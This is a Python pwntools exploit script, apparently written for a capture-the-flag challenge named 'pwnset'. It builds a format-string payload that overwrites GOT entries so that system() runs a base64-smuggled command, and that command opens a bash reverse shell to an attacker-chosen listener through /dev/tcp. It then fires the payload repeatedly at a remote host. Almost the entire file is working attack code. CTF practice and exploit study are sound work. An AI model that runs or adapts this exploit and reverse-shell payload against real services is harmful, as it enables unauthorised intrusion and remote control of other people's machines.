import base64
import math
import sys
import argparse
from pwn import *


def craft_payload(command: str):
    # lenght = len(command_b64) + 109
    lenght = 0

    fmt_part1 = b"%142$6034c%142$hn" # writes main function ret address to free() in GOT table
    fmt_part2 = b"%141$2203c%141$hn" # overwrites first to bytes of heap with ': ' so shell ignore this junk
    fmt_part3_tmpl = b"%*168$c%ARG$181387c%ARG$n" # template for calculating address of system, and overwriting closelog() got table with it

    pld_cmd = b"${IFS};echo${IFS}" # command encoded with b64
    pld_cmd += base64.b64encode(command.encode())
    pld_cmd += b"|base64${IFS}-d|bash;"
    pld_cmd += b"${IFS}:${IFS}'" # final steps, ignoring last address

    base_static = len(fmt_part1) + len(fmt_part2) + len(fmt_part3_tmpl) + len(pld_cmd) # almost static (680)

    if base_static >= 680:
        lenght = base_static
    else:
        lenght = base_static - 2

    padding = (-lenght) & 7
    arg = str(math.ceil(lenght/8) + 15)

    fmt_part3 = fmt_part3_tmpl.replace(b"ARG", arg.encode())

    pld_last = b"A" * padding # padding, to aling address
    pld_last += b"`4@" # address of closelog() GOT

    payload =  b""
    payload += fmt_part1
    payload += fmt_part2
    payload += fmt_part3
    payload += pld_cmd
    payload += pld_last

    if len(payload) > 999:
        log.failure("Payload is too long! I have just 1 question: HOW???")
        sys.exit()
    else:
        return payload

def exploit_thread(payload, payload_age, rhost, rport):
    while(True):
        p = remote(rhost, int(rport))
        p.sendlineafter(b'> ', b'1')
        p.sendlineafter(b': ', payload)
        p.sendlineafter(b': ', payload_age)

        l = log.progress('Checking')
        test = p.recv(timeout=3)
        if not test:
            l.success("Success! Go check your shell!")
            p.recvall()
        else:
            l.failure("Exploit didn't work! trying again")
            p.close()
            continue


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit for pwnset challenge")
    parser.add_argument("-rh", "--rhost", help="IP address of challenge")
    parser.add_argument("-rp", "--rport", help="Port of challenge")
    parser.add_argument("-lh", "--lhost", help="Your listener host")
    parser.add_argument("-lp", "--lport", help="Your listener port")
    args = parser.parse_args()

    payload = craft_payload(f"bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1")
    payload_age = b"4207704"
    log.info("Constructed payload!")

    exploit_thread(payload, payload_age, args.rhost, args.rport)